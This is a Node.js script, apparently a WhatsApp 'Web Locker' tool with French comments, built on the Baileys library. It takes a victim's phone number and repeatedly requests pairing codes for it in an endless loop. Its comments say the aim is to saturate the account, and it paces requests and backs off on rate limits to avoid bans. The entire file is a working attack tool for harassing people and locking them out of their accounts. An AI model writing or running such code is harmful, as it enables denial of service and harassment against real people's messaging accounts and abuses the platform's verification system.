const prompt = require('prompt-sync')();
const pino = require('pino');
const fs = require('fs');
const gradient = require('gradient-string').default || require('gradient-string');
const { default: makeWaSocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');

async function start() {
    console.clear();
    console.log(gradient(['magenta', 'red'])('╔════════════════════════════════════╗'));
    console.log(gradient(['magenta', 'red'])('║      NINJAXX - WEB LOCKER v3       ║'));
    console.log(gradient(['magenta', 'red'])('╚════════════════════════════════════╝'));

    // Création d'un dossier de session tout neuf
    const { state, saveCreds } = await useMultiFileAuthState('./session_web');

    const socket = makeWaSocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        printQRInTerminal: false
    });

    // Sauvegarde les crédentials pour éviter les erreurs de session
    socket.ev.on('creds.update', saveCreds);

    console.log(gradient(['cyan', 'white'])('\n[i] Protocole Web activé (Anti-Crash)'));

    let ddi = prompt('[+] Indicatif Pays (ex: 33) : ').replace('+', '');
    let number = prompt('[+] Numéro (ex: 712345678) : ').replace(/\s/g, '');
    let target = ddi + number;

    console.log(gradient(['red', 'orange'])(`\n[!] Attaque lancée sur : +${target}`));
    console.log("[i] Appuyez sur CTRL+C pour stopper\n");

    while (true) {
        try {
            // Utilisation du Pairing Code pour saturer le compte
            let code = await socket.requestPairingCode(target);
            console.log(gradient(['green', 'white'])(`[${new Date().toLocaleTimeString()}] Code envoyé : ${code}`));

            // Délai pour éviter le bannissement IP instantané
            await delay(10000);
        } catch (err) {
            if (err.output && err.output.statusCode === 429) {
                console.log(gradient(['yellow', 'red'])("[-] Trop de requêtes. Pause de 1 minute..."));
                await delay(60000);
            } else {
                // Si une erreur survient, on attend un peu et on recommence
                await delay(5000);
            }
        }
    }
}

// Lancement avec gestion d'erreur globale
start().catch(err => {
    console.log("\n[!] Erreur de lancement :");
    console.log(err.message);
    console.log("\n[i] Conseil : Tape 'rm -rf session_web' et relance.");
});
